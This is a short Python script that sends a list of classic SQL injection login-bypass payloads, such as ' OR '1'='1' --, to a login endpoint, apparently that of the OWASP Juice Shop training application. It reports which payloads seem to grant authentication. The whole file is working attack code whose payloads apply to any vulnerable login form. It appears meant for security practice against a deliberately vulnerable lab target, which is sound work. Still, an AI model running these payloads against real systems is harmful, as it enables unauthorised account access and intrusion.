import requests

# URL of the Juice Shop login endpoint
url = ''

# List of payloads to test for SQL injection
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 1=1 #",
    "' OR '1'='1' /*"
]


def test_sql_injection(url, payloads):
    for payload in payloads:
        data = {
            'email': payload,
            'password': 'password'
        }
        response = requests.post(url, data=data)
        try:
            response_json = response.json()
            if "authentication" in response_json:
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} did not succeed.")
        except ValueError:
            print(f"Payload {payload} did not succeed (invalid JSON response).")


# Run the test
test_sql_injection(url, payloads)
